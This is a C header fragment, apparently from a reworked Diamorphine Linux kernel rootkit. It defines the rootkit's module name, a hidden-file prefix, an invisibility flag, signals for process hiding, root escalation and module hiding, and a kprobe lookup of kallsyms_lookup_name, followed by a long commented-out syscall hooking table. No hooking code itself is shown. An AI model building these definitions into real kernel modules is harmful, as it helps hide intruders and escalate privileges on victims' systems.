// #include <linux/kernel.h>
// #include <linux/module.h>
// #include <linux/moduleparam.h>
// #include <linux/kallsyms.h>
// #include <linux/kprobes.h>
// #include <linux/syscalls.h>
// #include <linux/types.h>
// // #include <asm/utrap.h>
// #include <linux/cred.h>

// #include <linux/init.h>
// #include <linux/parser.h>
// #include <linux/version.h>	// for version macro
// #include <linux/moduleparam.h>	// for params

// #include <linux/ftrace.h>	// for kallsys
// #include <linux/slab.h>		// for kmalloc
// #include <linux/fs.h>		// for kernel_read
// #include <asm/uaccess.h>	// for segment descriptors


#include "misssing_defs.h"
// #include "handler_wrappers.h"

struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

#define MAGIC_PREFIX "diamorphine_secret"

#define PF_INVISIBLE 0x10000000

#define MODULE_NAME "diamorphine"

enum {
	SIGINVIS = 31,
	SIGSUPER = 64,
	SIGMODINVIS = 63,
};

#ifndef IS_ENABLED
#define IS_ENABLED(option) \
(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};
#endif



// #define NOT_PTR false
// #define PTR true

// typedef void* (*kallsyms_lookup_name_t)(const char *name);
// typedef asmlinkage long (*syscall_ptr_t)(const struct pt_regs*);

// // static int kprobe_handler(struct kprobe *p, struct pt_regs *regs);
// // static int subscribe_kprobes(void);

// typedef struct {
//   int type;
//   bool is_ptr;
// } ParamMeta;

// typedef struct {
//   ParamMeta meta;
//   SyscallParam param;
// } ParamBuffer;

// typedef struct {
//   int n_params;
//   ParamMeta params_meta[6]; 
// } SyscallSignature;

// typedef struct {
//   int number;
//   char name[64];
//   // Since all existing syscalls have only one parameter for user buffer, it is safe to define the number of argument responsible for buffer. For more complex scenarios, we can store the entire function signature.
//   // int buf_arg_idx;
//   // Optional parameter specifying number of bytes for operation
//   // The real buffer size should be greater or equal to it.
//   // int buf_size_arg_idx; 
//   SyscallSignature signature;
  
//   syscall_ptr_t original_addr;
//   syscall_ptr_t hooked_addr;
// } SyscallEntry;

// static ParamMeta params[6] = {{CHAR_PTR_TYPE, PTR}, {COMPAT_UPTR_T_PTR_TYPE, PTR}, {COMPAT_UPTR_T_PTR_TYPE, PTR}};

// const static SyscallSignature signature__x64_sys_execve = {
//   .n_params =  3,
//   .params_meta = {{CHAR_PTR_TYPE, PTR}, {COMPAT_UPTR_T_PTR_TYPE, PTR}, {COMPAT_UPTR_T_PTR_TYPE, PTR}}
// };

// #define SYSCALL_ENTRY(NUM, NAME)                                       \
//     (SyscallEntry)   {                                                   \
//         .number = (NUM),                                               \
//         .name = #NAME,                                                 \
//         .signature = signature__x64_sys_##NAME,                        \
//         .original_addr = NULL,                                         \
//         .hooked_addr = NULL                                            \
//     }


// SyscallEntry syscall_entries[] = {
// // SYSCALL_ENTRY(0,__x64_sys_read),
// // SYSCALL_ENTRY(1,__x64_sys_write),
// // SYSCALL_ENTRY(2,__x64_sys_open),
// // SYSCALL_ENTRY(3,__x64_sys_close),
// // SYSCALL_ENTRY(4,__x64_sys_newstat),
// // SYSCALL_ENTRY(5,__x64_sys_newfstat),
// // SYSCALL_ENTRY(6,__x64_sys_newlstat),
// // SYSCALL_ENTRY(7,__x64_sys_poll),
// // SYSCALL_ENTRY(8,__x64_sys_lseek),
// // SYSCALL_ENTRY(9,__x64_sys_mmap),
// // SYSCALL_ENTRY(10,__x64_sys_mprotect),
// // SYSCALL_ENTRY(11,__x64_sys_munmap),
// // SYSCALL_ENTRY(12,__x64_sys_brk),
// // SYSCALL_ENTRY(13,__x64_sys_rt_sigaction),
// // SYSCALL_ENTRY(14,__x64_sys_rt_sigprocmask),
// // SYSCALL_ENTRY(15,__x64_sys_rt_sigreturn),
// // SYSCALL_ENTRY(16,__x64_sys_ioctl),
// // SYSCALL_ENTRY(17,__x64_sys_pread64),
// // SYSCALL_ENTRY(18,__x64_sys_pwrite64),
// // SYSCALL_ENTRY(19,__x64_sys_readv),
// // SYSCALL_ENTRY(20,__x64_sys_writev),
// // SYSCALL_ENTRY(21,__x64_sys_access),
// // SYSCALL_ENTRY(22,__x64_sys_pipe),
// // SYSCALL_ENTRY(23,__x64_sys_select),
// // SYSCALL_ENTRY(24,__x64_sys_sched_yield),
// // SYSCALL_ENTRY(25,__x64_sys_mremap),
// // SYSCALL_ENTRY(26,__x64_sys_msync),
// // SYSCALL_ENTRY(27,__x64_sys_mincore),
// // SYSCALL_ENTRY(28,__x64_sys_madvise),
// // SYSCALL_ENTRY(29,__x64_sys_shmget),
// // SYSCALL_ENTRY(30,__x64_sys_shmat),
// // SYSCALL_ENTRY(31,__x64_sys_shmctl),
// // SYSCALL_ENTRY(32,__x64_sys_dup),
// // SYSCALL_ENTRY(33,__x64_sys_dup2),
// // SYSCALL_ENTRY(34,__x64_sys_pause),
// // SYSCALL_ENTRY(35,__x64_sys_nanosleep),
// // SYSCALL_ENTRY(36,__x64_sys_getitimer),
// // SYSCALL_ENTRY(37,__x64_sys_alarm),
// // SYSCALL_ENTRY(38,__x64_sys_setitimer),
// // SYSCALL_ENTRY(39,__x64_sys_getpid),

// // SYSCALL_ENTRY(40,__x64_sys_sendfile64),
// // SYSCALL_ENTRY(41,__x64_sys_socket),
// // SYSCALL_ENTRY(42,__x64_sys_connect),
// // SYSCALL_ENTRY(43,__x64_sys_accept),
// // SYSCALL_ENTRY(44,__x64_sys_sendto),
// // SYSCALL_ENTRY(45,__x64_sys_recvfrom),
// // SYSCALL_ENTRY(46,__x64_sys_sendmsg),
// // SYSCALL_ENTRY(47,__x64_sys_recvmsg),
// // SYSCALL_ENTRY(48,__x64_sys_shutdown),
// // SYSCALL_ENTRY(49,__x64_sys_bind),
// // SYSCALL_ENTRY(50,__x64_sys_listen),
// // SYSCALL_ENTRY(51,__x64_sys_getsockname),
// // SYSCALL_ENTRY(52,__x64_sys_getpeername),
// // SYSCALL_ENTRY(53,__x64_sys_socketpair),
// // SYSCALL_ENTRY(54,__x64_sys_setsockopt),
// // SYSCALL_ENTRY(55,__x64_sys_getsockopt),
// // SYSCALL_ENTRY(56,__x64_sys_clone),
// // SYSCALL_ENTRY(57,__x64_sys_fork),
// // SYSCALL_ENTRY(58,__x64_sys_vfork),
// SYSCALL_ENTRY(59, execve),
// // SYSCALL_ENTRY(60,__x64_sys_exit    ),
// // SYSCALL_ENTRY(61,__x64_sys_wait4),
// // SYSCALL_ENTRY(62,__x64_sys_kill),
// // SYSCALL_ENTRY(63,__x64_sys_newuname),
// // SYSCALL_ENTRY(64,__x64_sys_semget),
// // SYSCALL_ENTRY(65,__x64_sys_semop),
// // SYSCALL_ENTRY(66,__x64_sys_semctl),
// // SYSCALL_ENTRY(67,__x64_sys_shmdt),
// // SYSCALL_ENTRY(68,__x64_sys_msgget),
// // SYSCALL_ENTRY(69,__x64_sys_msgsnd),
// // SYSCALL_ENTRY(70,__x64_sys_msgrcv),
// // SYSCALL_ENTRY(71,__x64_sys_msgctl),
// // SYSCALL_ENTRY(72,__x64_sys_fcntl),
// // SYSCALL_ENTRY(73,__x64_sys_flock),
// // SYSCALL_ENTRY(74,__x64_sys_fsync),
// // SYSCALL_ENTRY(75,__x64_sys_fdatasync),
// // SYSCALL_ENTRY(76,__x64_sys_truncate),
// // SYSCALL_ENTRY(77,__x64_sys_ftruncate),
// // SYSCALL_ENTRY(78,__x64_sys_getdents),
// // SYSCALL_ENTRY(79,__x64_sys_getcwd),
// // SYSCALL_ENTRY(80,__x64_sys_chdir),
// // SYSCALL_ENTRY(81,__x64_sys_fchdir),
// // SYSCALL_ENTRY(82,__x64_sys_rename),
// // SYSCALL_ENTRY(83,__x64_sys_mkdir),
// // SYSCALL_ENTRY(84,__x64_sys_rmdir),
// // SYSCALL_ENTRY(85,__x64_sys_creat),
// // SYSCALL_ENTRY(86,__x64_sys_link),
// // SYSCALL_ENTRY(87,__x64_sys_unlink),
// // SYSCALL_ENTRY(88,__x64_sys_symlink),
// // SYSCALL_ENTRY(89,__x64_sys_readlink),
// // SYSCALL_ENTRY(90,__x64_sys_chmod),
// // SYSCALL_ENTRY(91,__x64_sys_fchmod),
// // SYSCALL_ENTRY(92,__x64_sys_chown),
// // SYSCALL_ENTRY(93,__x64_sys_fchown),
// // SYSCALL_ENTRY(94,__x64_sys_lchown),
// // SYSCALL_ENTRY(95,__x64_sys_umask),
// // SYSCALL_ENTRY(96,__x64_sys_gettimeofday),
// // SYSCALL_ENTRY(97,__x64_sys_getrlimit),
// // SYSCALL_ENTRY(98,__x64_sys_getrusage),
// // SYSCALL_ENTRY(99,__x64_sys_sysinfo),
// // SYSCALL_ENTRY(100,__x64_sys_times),
// // SYSCALL_ENTRY(101,__x64_sys_ptrace),
// // SYSCALL_ENTRY(102,__x64_sys_getuid),
// // SYSCALL_ENTRY(103,__x64_sys_syslog),
// // SYSCALL_ENTRY(104,__x64_sys_getgid),
// // SYSCALL_ENTRY(105,__x64_sys_setuid),
// // SYSCALL_ENTRY(106,__x64_sys_setgid),
// // SYSCALL_ENTRY(107,__x64_sys_geteuid),
// // SYSCALL_ENTRY(108,__x64_sys_getegid),
// // SYSCALL_ENTRY(109,__x64_sys_setpgid),
// // SYSCALL_ENTRY(110,__x64_sys_getppid),
// // SYSCALL_ENTRY(111,__x64_sys_getpgrp),
// // SYSCALL_ENTRY(112,__x64_sys_setsid),
// // SYSCALL_ENTRY(113,__x64_sys_setreuid),
// // SYSCALL_ENTRY(114,__x64_sys_setregid),
// // SYSCALL_ENTRY(115,__x64_sys_getgroups),
// // SYSCALL_ENTRY(116,__x64_sys_setgroups),
// // SYSCALL_ENTRY(117,__x64_sys_setresuid),
// // SYSCALL_ENTRY(118,__x64_sys_getresuid),
// // SYSCALL_ENTRY(119,__x64_sys_setresgid),
// // SYSCALL_ENTRY(120,__x64_sys_getresgid),
// // SYSCALL_ENTRY(121,__x64_sys_getpgid),
// // SYSCALL_ENTRY(122,__x64_sys_setfsuid),
// // SYSCALL_ENTRY(123,__x64_sys_setfsgid),
// // SYSCALL_ENTRY(124,__x64_sys_getsid),
// // SYSCALL_ENTRY(125,__x64_sys_capget),
// // SYSCALL_ENTRY(126,__x64_sys_capset),
// // SYSCALL_ENTRY(127,__x64_sys_rt_sigpending),
// // SYSCALL_ENTRY(128,__x64_sys_rt_sigtimedwait),
// // SYSCALL_ENTRY(129,__x64_sys_rt_sigqueueinfo),
// // SYSCALL_ENTRY(130,__x64_sys_rt_sigsuspend),
// // SYSCALL_ENTRY(131,__x64_sys_sigaltstack),
// // SYSCALL_ENTRY(132,__x64_sys_utime),
// // SYSCALL_ENTRY(133,__x64_sys_mknod),
// // SYSCALL_ENTRY(135,__x64_sys_personality),
// // SYSCALL_ENTRY(136,__x64_sys_ustat),
// // SYSCALL_ENTRY(137,__x64_sys_statfs),
// // SYSCALL_ENTRY(138,__x64_sys_fstatfs),
// // SYSCALL_ENTRY(139,__x64_sys_sysfs),
// // SYSCALL_ENTRY(140,__x64_sys_getpriority),
// // SYSCALL_ENTRY(141,__x64_sys_setpriority),
// // SYSCALL_ENTRY(142,__x64_sys_sched_setparam),
// // SYSCALL_ENTRY(143,__x64_sys_sched_getparam),
// // SYSCALL_ENTRY(144,__x64_sys_sched_setscheduler),
// // SYSCALL_ENTRY(145,__x64_sys_sched_getscheduler),
// // SYSCALL_ENTRY(146,__x64_sys_sched_get_priority_max),
// // SYSCALL_ENTRY(147,__x64_sys_sched_get_priority_min),
// // SYSCALL_ENTRY(148,__x64_sys_sched_rr_get_interval),
// // SYSCALL_ENTRY(149,__x64_sys_mlock),
// // SYSCALL_ENTRY(150,__x64_sys_munlock),
// // SYSCALL_ENTRY(151,__x64_sys_mlockall),
// // SYSCALL_ENTRY(152,__x64_sys_munlockall),
// // SYSCALL_ENTRY(153,__x64_sys_vhangup),
// // SYSCALL_ENTRY(154,__x64_sys_modify_ldt),
// // SYSCALL_ENTRY(155,__x64_sys_pivot_root),
// // SYSCALL_ENTRY(156,__x64_sys_ni_syscall),
// // SYSCALL_ENTRY(157,__x64_sys_prctl),
// // SYSCALL_ENTRY(158,__x64_sys_arch_prctl),
// // SYSCALL_ENTRY(159,__x64_sys_adjtimex),
// // SYSCALL_ENTRY(160,__x64_sys_setrlimit),
// // SYSCALL_ENTRY(161,__x64_sys_chroot),
// // SYSCALL_ENTRY(162,__x64_sys_sync),
// // SYSCALL_ENTRY(163,__x64_sys_acct),
// // SYSCALL_ENTRY(164,__x64_sys_settimeofday),
// // SYSCALL_ENTRY(165,__x64_sys_mount),
// // SYSCALL_ENTRY(166,__x64_sys_umount),
// // SYSCALL_ENTRY(167,__x64_sys_swapon),
// // SYSCALL_ENTRY(168,__x64_sys_swapoff),
// // SYSCALL_ENTRY(169,__x64_sys_reboot),
// // SYSCALL_ENTRY(170,__x64_sys_sethostname),
// // SYSCALL_ENTRY(171,__x64_sys_setdomainname),
// // SYSCALL_ENTRY(172,__x64_sys_iopl),
// // SYSCALL_ENTRY(173,__x64_sys_ioperm),
// // SYSCALL_ENTRY(175,__x64_sys_init_module),
// // SYSCALL_ENTRY(176,__x64_sys_delete_module),
// // SYSCALL_ENTRY(179,__x64_sys_quotactl),
// // SYSCALL_ENTRY(186,__x64_sys_gettid),
// // SYSCALL_ENTRY(187,__x64_sys_readahead),
// // SYSCALL_ENTRY(188,__x64_sys_setxattr),
// // SYSCALL_ENTRY(189,__x64_sys_lsetxattr),
// // SYSCALL_ENTRY(190,__x64_sys_fsetxattr),
// // SYSCALL_ENTRY(191,__x64_sys_getxattr),
// // SYSCALL_ENTRY(192,__x64_sys_lgetxattr),
// // SYSCALL_ENTRY(193,__x64_sys_fgetxattr),
// // SYSCALL_ENTRY(194,__x64_sys_listxattr),
// // SYSCALL_ENTRY(195,__x64_sys_llistxattr),
// // SYSCALL_ENTRY(196,__x64_sys_flistxattr),
// // SYSCALL_ENTRY(197,__x64_sys_removexattr),
// // SYSCALL_ENTRY(198,__x64_sys_lremovexattr),
// // SYSCALL_ENTRY(199,__x64_sys_fremovexattr),
// // SYSCALL_ENTRY(200,__x64_sys_tkill),
// // SYSCALL_ENTRY(201,__x64_sys_time),
// // SYSCALL_ENTRY(202,__x64_sys_futex),
// // SYSCALL_ENTRY(203,__x64_sys_sched_setaffinity),
// // SYSCALL_ENTRY(204,__x64_sys_sched_getaffinity),
// // SYSCALL_ENTRY(206,__x64_sys_io_setup),
// // SYSCALL_ENTRY(207,__x64_sys_io_destroy),
// // SYSCALL_ENTRY(208,__x64_sys_io_getevents),
// // SYSCALL_ENTRY(209,__x64_sys_io_submit),
// // SYSCALL_ENTRY(210,__x64_sys_io_cancel),
// // SYSCALL_ENTRY(213,__x64_sys_epoll_create),
// // SYSCALL_ENTRY(216,__x64_sys_remap_file_pages),
// // SYSCALL_ENTRY(217,__x64_sys_getdents64),
// // SYSCALL_ENTRY(218,__x64_sys_set_tid_address),
// // SYSCALL_ENTRY(219,__x64_sys_restart_syscall),
// // SYSCALL_ENTRY(220,__x64_sys_semtimedop),
// // SYSCALL_ENTRY(221,__x64_sys_fadvise64),
// // SYSCALL_ENTRY(222,__x64_sys_timer_create),
// // SYSCALL_ENTRY(223,__x64_sys_timer_settime),
// // SYSCALL_ENTRY(224,__x64_sys_timer_gettime),
// // SYSCALL_ENTRY(225,__x64_sys_timer_getoverrun),
// // SYSCALL_ENTRY(226,__x64_sys_timer_delete),
// // SYSCALL_ENTRY(227,__x64_sys_clock_settime),
// // SYSCALL_ENTRY(228,__x64_sys_clock_gettime),
// // SYSCALL_ENTRY(229,__x64_sys_clock_getres),
// // SYSCALL_ENTRY(230,__x64_sys_clock_nanosleep),
// // SYSCALL_ENTRY(231,__x64_sys_exit_group),
// // SYSCALL_ENTRY(232,__x64_sys_epoll_wait),
// // SYSCALL_ENTRY(233,__x64_sys_epoll_ctl),
// // SYSCALL_ENTRY(234,__x64_sys_tgkill),
// // SYSCALL_ENTRY(235,__x64_sys_utimes),
// // SYSCALL_ENTRY(237,__x64_sys_mbind),
// // SYSCALL_ENTRY(238,__x64_sys_set_mempolicy),
// // SYSCALL_ENTRY(239,__x64_sys_get_mempolicy),
// // SYSCALL_ENTRY(240,__x64_sys_mq_open),
// // SYSCALL_ENTRY(241,__x64_sys_mq_unlink),
// // SYSCALL_ENTRY(242,__x64_sys_mq_timedsend),
// // SYSCALL_ENTRY(243,__x64_sys_mq_timedreceive),
// // SYSCALL_ENTRY(244,__x64_sys_mq_notify),
// // SYSCALL_ENTRY(245,__x64_sys_mq_getsetattr),
// // SYSCALL_ENTRY(246,__x64_sys_kexec_load),
// // SYSCALL_ENTRY(247,__x64_sys_waitid),
// // SYSCALL_ENTRY(248,__x64_sys_add_key),
// // SYSCALL_ENTRY(249,__x64_sys_request_key),
// // SYSCALL_ENTRY(250,__x64_sys_keyctl),
// // SYSCALL_ENTRY(251,__x64_sys_ioprio_set),
// // SYSCALL_ENTRY(252,__x64_sys_ioprio_get),
// // SYSCALL_ENTRY(253,__x64_sys_inotify_init),
// // SYSCALL_ENTRY(254,__x64_sys_inotify_add_watch),
// // SYSCALL_ENTRY(255,__x64_sys_inotify_rm_watch),
// // SYSCALL_ENTRY(256,__x64_sys_migrate_pages),
// // SYSCALL_ENTRY(257,__x64_sys_openat),
// // SYSCALL_ENTRY(258,__x64_sys_mkdirat),
// // SYSCALL_ENTRY(259,__x64_sys_mknodat),
// // SYSCALL_ENTRY(260,__x64_sys_fchownat),
// // SYSCALL_ENTRY(261,__x64_sys_futimesat),
// // SYSCALL_ENTRY(262,__x64_sys_newfstatat),
// // SYSCALL_ENTRY(263,__x64_sys_unlinkat),
// // SYSCALL_ENTRY(264,__x64_sys_renameat),
// // SYSCALL_ENTRY(265,__x64_sys_linkat),
// // SYSCALL_ENTRY(266,__x64_sys_symlinkat),
// // SYSCALL_ENTRY(267,__x64_sys_readlinkat),
// // SYSCALL_ENTRY(268,__x64_sys_fchmodat),
// // SYSCALL_ENTRY(269,__x64_sys_faccessat),
// // SYSCALL_ENTRY(270,__x64_sys_pselect6),
// // SYSCALL_ENTRY(271,__x64_sys_ppoll),
// // SYSCALL_ENTRY(272,__x64_sys_unshare),
// // SYSCALL_ENTRY(273,__x64_sys_set_robust_list),
// // SYSCALL_ENTRY(274,__x64_sys_get_robust_list),
// // SYSCALL_ENTRY(275,__x64_sys_splice),
// // SYSCALL_ENTRY(276,__x64_sys_tee),
// // SYSCALL_ENTRY(277,__x64_sys_sync_file_range),
// // SYSCALL_ENTRY(278,__x64_sys_vmsplice),
// // SYSCALL_ENTRY(279,__x64_sys_move_pages),
// // SYSCALL_ENTRY(280,__x64_sys_utimensat),
// // SYSCALL_ENTRY(281,__x64_sys_epoll_pwait),
// // SYSCALL_ENTRY(282,__x64_sys_signalfd),
// // SYSCALL_ENTRY(283,__x64_sys_timerfd_create),
// // SYSCALL_ENTRY(284,__x64_sys_eventfd),
// // SYSCALL_ENTRY(285,__x64_sys_fallocate),
// // SYSCALL_ENTRY(286,__x64_sys_timerfd_settime),
// // SYSCALL_ENTRY(287,__x64_sys_timerfd_gettime),
// // SYSCALL_ENTRY(288,__x64_sys_accept4),
// // SYSCALL_ENTRY(289,__x64_sys_signalfd4),
// // SYSCALL_ENTRY(290,__x64_sys_eventfd2),
// // SYSCALL_ENTRY(291,__x64_sys_epoll_create1),
// // SYSCALL_ENTRY(292,__x64_sys_dup3),
// // SYSCALL_ENTRY(293,__x64_sys_pipe2),
// // SYSCALL_ENTRY(294,__x64_sys_inotify_init1),
// // SYSCALL_ENTRY(295,__x64_sys_preadv),
// // SYSCALL_ENTRY(296,__x64_sys_pwritev),
// // SYSCALL_ENTRY(297,__x64_sys_rt_tgsigqueueinfo),
// // SYSCALL_ENTRY(298,__x64_sys_perf_event_open),
// // SYSCALL_ENTRY(299,__x64_sys_recvmmsg),
// // SYSCALL_ENTRY(300,__x64_sys_fanotify_init),
// // SYSCALL_ENTRY(301,__x64_sys_fanotify_mark),
// // SYSCALL_ENTRY(302,__x64_sys_prlimit64),
// // SYSCALL_ENTRY(303,__x64_sys_name_to_handle_at),
// // SYSCALL_ENTRY(304,__x64_sys_open_by_handle_at),
// // SYSCALL_ENTRY(305,__x64_sys_clock_adjtime),
// // SYSCALL_ENTRY(306,__x64_sys_syncfs),
// // SYSCALL_ENTRY(307,__x64_sys_sendmmsg),
// // SYSCALL_ENTRY(308,__x64_sys_setns),
// // SYSCALL_ENTRY(309,__x64_sys_getcpu),
// // SYSCALL_ENTRY(310,__x64_sys_process_vm_readv),
// // SYSCALL_ENTRY(311,__x64_sys_process_vm_writev),
// // SYSCALL_ENTRY(312,__x64_sys_kcmp),
// // SYSCALL_ENTRY(313,__x64_sys_finit_module),
// // SYSCALL_ENTRY(314,__x64_sys_sched_setattr),
// // SYSCALL_ENTRY(315,__x64_sys_sched_getattr),
// // SYSCALL_ENTRY(316,__x64_sys_renameat2),
// // SYSCALL_ENTRY(317,__x64_sys_seccomp),
// // SYSCALL_ENTRY(318,__x64_sys_getrandom),
// // SYSCALL_ENTRY(319,__x64_sys_memfd_create),
// // SYSCALL_ENTRY(320,__x64_sys_kexec_file_load),
// // SYSCALL_ENTRY(321,__x64_sys_bpf),
// // SYSCALL_ENTRY(322,__x64_sys_execveat),
// // SYSCALL_ENTRY(323,__x64_sys_userfaultfd),
// // SYSCALL_ENTRY(324,__x64_sys_membarrier),
// // SYSCALL_ENTRY(325,__x64_sys_mlock2),
// // SYSCALL_ENTRY(326,__x64_sys_copy_file_range),
// // SYSCALL_ENTRY(327,__x64_sys_preadv2),
// // SYSCALL_ENTRY(328,__x64_sys_pwritev2),
// // SYSCALL_ENTRY(329,__x64_sys_pkey_mprotect),
// // SYSCALL_ENTRY(330,__x64_sys_pkey_alloc),
// // SYSCALL_ENTRY(331,__x64_sys_pkey_free),
// // SYSCALL_ENTRY(332,__x64_sys_statx),
// // SYSCALL_ENTRY(333,__x64_sys_io_pgetevents),
// // SYSCALL_ENTRY(334,__x64_sys_rseq),
// // SYSCALL_ENTRY(335,__x64_sys_uretprobe),
// // SYSCALL_ENTRY(424,__x64_sys_pidfd_send_signal),
// // SYSCALL_ENTRY(425,__x64_sys_io_uring_setup),
// // SYSCALL_ENTRY(426,__x64_sys_io_uring_enter),
// // SYSCALL_ENTRY(427,__x64_sys_io_uring_register),
// // SYSCALL_ENTRY(428,__x64_sys_open_tree),
// // SYSCALL_ENTRY(429,__x64_sys_move_mount),
// // SYSCALL_ENTRY(430,__x64_sys_fsopen),
// // SYSCALL_ENTRY(431,__x64_sys_fsconfig),
// // SYSCALL_ENTRY(432,__x64_sys_fsmount),
// // SYSCALL_ENTRY(433,__x64_sys_fspick),
// // SYSCALL_ENTRY(434,__x64_sys_pidfd_open),
// // SYSCALL_ENTRY(435,__x64_sys_clone3),
// // SYSCALL_ENTRY(436,__x64_sys_close_range),
// // SYSCALL_ENTRY(437,__x64_sys_openat2),
// // SYSCALL_ENTRY(438,__x64_sys_pidfd_getfd),
// // SYSCALL_ENTRY(439,__x64_sys_faccessat2),
// // SYSCALL_ENTRY(440,__x64_sys_process_madvise),
// // SYSCALL_ENTRY(441,__x64_sys_epoll_pwait2),
// // SYSCALL_ENTRY(442,__x64_sys_mount_setattr),
// // SYSCALL_ENTRY(443,__x64_sys_quotactl_fd),
// // SYSCALL_ENTRY(444,__x64_sys_landlock_create_ruleset),
// // SYSCALL_ENTRY(445,__x64_sys_landlock_add_rule),
// // SYSCALL_ENTRY(446,__x64_sys_landlock_restrict_self),
// // SYSCALL_ENTRY(447,__x64_sys_memfd_secret),
// // SYSCALL_ENTRY(448,__x64_sys_process_mrelease),
// // SYSCALL_ENTRY(449,__x64_sys_futex_waitv),
// // SYSCALL_ENTRY(450,__x64_sys_set_mempolicy_home_node),
// // SYSCALL_ENTRY(451,__x64_sys_cachestat),
// // SYSCALL_ENTRY(452,__x64_sys_fchmodat2),
// // SYSCALL_ENTRY(453,__x64_sys_map_shadow_stack),
// // SYSCALL_ENTRY(454,__x64_sys_futex_wake),
// // SYSCALL_ENTRY(455,__x64_sys_futex_wait),
// // SYSCALL_ENTRY(456,__x64_sys_futex_requeue),
// // SYSCALL_ENTRY(457,__x64_sys_statmount),
// // SYSCALL_ENTRY(458,__x64_sys_listmount),
// // SYSCALL_ENTRY(459,__x64_sys_lsm_get_self_attr),
// // SYSCALL_ENTRY(460,__x64_sys_lsm_set_self_attr),
// // SYSCALL_ENTRY(461,__x64_sys_lsm_list_modules),
// // SYSCALL_ENTRY(462,__x64_sys_mseal),
// // SYSCALL_ENTRY(463,__x64_sys_setxattrat),
// // SYSCALL_ENTRY(464,__x64_sys_getxattrat),
// // SYSCALL_ENTRY(465,__x64_sys_listxattrat),
// // SYSCALL_ENTRY(466,__x64_sys_removexattrat),
// // SYSCALL_ENTRY(512,__x64_compat_sys_rt_sigaction),
// // SYSCALL_ENTRY(513,__x64_compat_sys_x32_rt_sigreturn),
// // SYSCALL_ENTRY(514,__x64_compat_sys_ioctl),
// // SYSCALL_ENTRY(515,__x64_sys_readv),
// // SYSCALL_ENTRY(516,__x64_sys_writev),
// // SYSCALL_ENTRY(517,__x64_compat_sys_recvfrom),
// // SYSCALL_ENTRY(518,__x64_compat_sys_sendmsg),
// // SYSCALL_ENTRY(519,__x64_compat_sys_recvmsg),
// // SYSCALL_ENTRY(520,__x64_compat_sys_execve),
// // SYSCALL_ENTRY(521,__x64_compat_sys_ptrace),
// // SYSCALL_ENTRY(522,__x64_compat_sys_rt_sigpending),
// // SYSCALL_ENTRY(523,__x64_compat_sys_rt_sigtimedwait_time64),
// // SYSCALL_ENTRY(524,__x64_compat_sys_rt_sigqueueinfo),
// // SYSCALL_ENTRY(525,__x64_compat_sys_sigaltstack),
// // SYSCALL_ENTRY(526,__x64_compat_sys_timer_create),
// // SYSCALL_ENTRY(527,__x64_compat_sys_mq_notify),
// // SYSCALL_ENTRY(528,__x64_compat_sys_kexec_load),
// // SYSCALL_ENTRY(529,__x64_compat_sys_waitid),
// // SYSCALL_ENTRY(530,__x64_compat_sys_set_robust_list),
// // SYSCALL_ENTRY(531,__x64_compat_sys_get_robust_list),
// // SYSCALL_ENTRY(532,__x64_sys_vmsplice),
// // SYSCALL_ENTRY(533,__x64_sys_move_pages),
// // SYSCALL_ENTRY(534,__x64_compat_sys_preadv64),
// // SYSCALL_ENTRY(535,__x64_compat_sys_pwritev64),
// // SYSCALL_ENTRY(536,__x64_compat_sys_rt_tgsigqueueinfo),
// // SYSCALL_ENTRY(537,__x64_compat_sys_recvmmsg_time64),
// // SYSCALL_ENTRY(538,__x64_compat_sys_sendmmsg),
// // SYSCALL_ENTRY(539,__x64_sys_process_vm_readv),
// // SYSCALL_ENTRY(540,__x64_sys_process_vm_writev),
// // SYSCALL_ENTRY(541,__x64_sys_setsockopt),
// // SYSCALL_ENTRY(542,__x64_sys_getsockopt),
// // SYSCALL_ENTRY(543,__x64_compat_sys_io_setup),
// // SYSCALL_ENTRY(544,__x64_compat_sys_io_submit),
// // SYSCALL_ENTRY(545,__x64_compat_sys_execveat),
// // SYSCALL_ENTRY(546,__x64_compat_sys_preadv64v2),
// // SYSCALL_ENTRY(547,__x64_compat_sys_pwritev64v2),
// };


// int N_ACTIVE_HOOKS;

